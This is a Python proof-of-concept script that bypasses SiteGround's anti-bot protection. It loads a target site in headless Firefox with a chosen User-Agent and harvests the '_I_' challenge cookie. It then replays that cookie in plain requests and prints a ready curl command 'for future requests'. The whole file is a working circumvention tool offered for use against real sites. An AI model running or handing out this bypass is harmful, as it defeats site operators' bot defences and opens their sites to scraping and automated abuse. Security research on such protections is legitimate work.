import requests
import shutil
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
import time
import argparse

parser = argparse.ArgumentParser(description="PoC that Bypass SiteGround AI Antibot protection")
parser.add_argument("-t", "--target", type=str,help="Target to run the attack", required=True)
parser.add_argument("-ua", "--user-agent", help="Specify a custom UA")
parser.add_argument("--geckodriver", help="Path to geckodriver binary")
args = parser.parse_args()

geckodriver_path = args.geckodriver or shutil.which("geckodriver")
if not geckodriver_path:
    raise SystemExit("geckodriver not found. Download it from https://github.com/mozilla/geckodriver/releases/ or pass --geckodriver /path/to/geckodriver")



# URL to request
target = args.target



user_agent = "cromium"
if args.user_agent:
    user_agent = args.user_agent


print(f"Generating ID from the request with User-Agent: {user_agent} to target: {target}")
firefox_options = Options()
# Enable headless mode
firefox_options.add_argument("--headless")
# Set the custom user agent
firefox_options.set_preference("general.useragent.override", user_agent)
driver = webdriver.Firefox(options=firefox_options, service=Service(geckodriver_path))
driver.get(args.target)
time.sleep(10)
# Get all cookies
cookie = driver.get_cookie("_I_")['value']
driver.close()


print("Testing the request...\n")

# Define the headers
headers = {
    "User-Agent": user_agent,
}

# Define the cookies
cookies = {
    "_I_": cookie,
}
# Make the GET request

try:
    response = requests.get(target, headers=headers, cookies=cookies)

    # Print the response content
    if response.status_code == 200:
        print(f"Valid Cookie ID and User-Agent\n\nUse in your future requests:\nCookie: _I_: {cookie}\nHeader: User-Agent: {user_agent}\n\nExample: \n- curl -I \"{target}\" -H \"Cookie: _I_={cookie}\" -H \"User-Agent: {user_agent}\"")
    else:
        print("Invalid Cookie Id an User-Agent")
except requests.exceptions.InvalidSchema:
    print("Invalid target")
